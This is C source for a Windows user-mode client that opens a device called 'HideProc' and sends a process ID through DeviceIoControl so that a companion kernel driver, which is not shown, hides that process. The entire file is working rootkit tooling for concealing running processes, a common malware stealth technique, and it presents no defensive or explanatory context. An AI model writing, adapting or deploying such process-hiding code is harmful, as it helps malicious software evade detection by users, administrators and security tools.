#include <windows.h>
#include <stdio.h>


#define IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _HIDE_PROCESS_REQUEST
{
	ULONG ProcessId;
} HIDE_PROCESS_REQUEST, * PHIDE_PROCESS_REQUEST;

int main(int argc, char* argv[]) {

	if (argc != 2) {
		printf("[+] Usage: %s <ProcessId>\n", argv[0]);
		return -1;
	}

	HANDLE hDevice = CreateFileA(
		"\\\\.\\HideProc",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open device. Error: %lu\n", GetLastError());
		return -1;
	}

	PHIDE_PROCESS_REQUEST HideProc = (PHIDE_PROCESS_REQUEST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(HIDE_PROCESS_REQUEST));

	if (HideProc == NULL) {
		printf("[-] Failed to allocate memory for HideProc request.\n");
		return -1;
	}

	HideProc->ProcessId = (ULONG)atoi(argv[1]);

	DWORD bytesReturned;
	BOOL result = DeviceIoControl(
		hDevice,
		IOCTL_HIDE_PROCESS,
		HideProc,
		sizeof(HIDE_PROCESS_REQUEST),
		NULL,
		0,
		&bytesReturned,
		NULL	
	);

	if (!result) {
		printf("[-] DeviceIoControl failed. Error: %lu\n", GetLastError());
		goto cleanup;
	}

	printf("[+] Process with PID %lu hidden successfully.\n", HideProc->ProcessId);


cleanup:
	if (HideProc) {
		HeapFree(GetProcessHeap(), 0, HideProc);
	}
	if (hDevice) {
		CloseHandle(hDevice);
	}
	return 0;
}